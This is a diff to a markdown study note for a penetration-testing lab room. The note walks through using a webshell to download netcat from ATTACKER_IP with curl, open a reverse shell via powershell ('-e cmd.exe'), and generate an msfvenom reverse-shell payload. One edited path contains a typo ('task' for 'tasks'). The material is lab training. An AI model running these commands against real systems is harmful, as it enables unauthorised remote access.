@@ -75,7 +75,10 @@ Instead we'll stick with trusty old cURL.
 
 From #Webshell  use cURL to upload your new copy of netcat to the target:
 
-`curl http://ATTACKER_IP/nc.exe/nc64.exe -o c:\\windows\\temp\\nc-USERNAME.exe   `
+`curl http://ATTACKER_IP/nc.exe/nc64.exe -o c:\\windows\\tasks\\nc-USERNAME.exe   `
+
+> [!info]
+>The room says to use the temp folder within Windows, however, I had trouble with that, a much safer and more guaranteed option is to use the tasks folders as that’s world writable.
 
 > [!Note]
 >Note the double backslashes used here. This is purely due to how the webshell handles backslashes. We need to escape the backslashes so that they are passed in as a part of the command, as opposed to escaping the letters immediately after them.
@@ -87,12 +90,21 @@ Set up a netcat listener on your #Attacking_Machine
 
 In your #webshell, use the following command:
 
-`powershell.exe c:\\windows\\temp\\nc-USERNAME.exe ATTACKER_IP ATTACKER_PORT -e cmd.exe   `
+`powershell.exe c:\\windows\\task\\nc-USERNAME.exe ATTACKER_IP ATTACKER_PORT -e cmd.exe   `
 
 e.g.  
-`powershell.exe c:\\windows\\temp\\nc-MuirlandOracle.exe 10.50.73.2 443 -e cmd.exe   `
+`powershell.exe c:\\windows\\tasks\\nc-MuirlandOracle.exe 10.50.73.2 443 -e cmd.exe   `
 
 This should result in a reverse shell from the target!
 
 ![[ac7e2a438cd5.webp]]
+
+> [!Note]
+>In order for this to work we had to wrap the netcat command inside a powershell process to keep it from exiting early.
+
+**Bonus Question (optional):** Try generating a metasploit reverse shell and transfer it to the target (`msfvenom -p windows/x64/shell_reverse_tcp -f exe -o shell.exe LHOST=ATTACKING_IP LPORT=CHOOSE_A_PORT`) -- make sure to place it in a directory you can list (e.g. the Uploads directory of the webserver). This shell will get picked up by Defender (so don't do it anywhere else!), but it will give you a feel for how antivirus operates when it detects your payload as being malicious.
+
+You should get an error message when trying to execute the executable and the exe will also disappear from the current directory (placed into quarantine by the AV). At this point the Administrator has also been alerted, along with the security team in a bigger organisation.
+
+**Next sep: ** [[AV EVASION/Enumeration|Enumeration]]
 
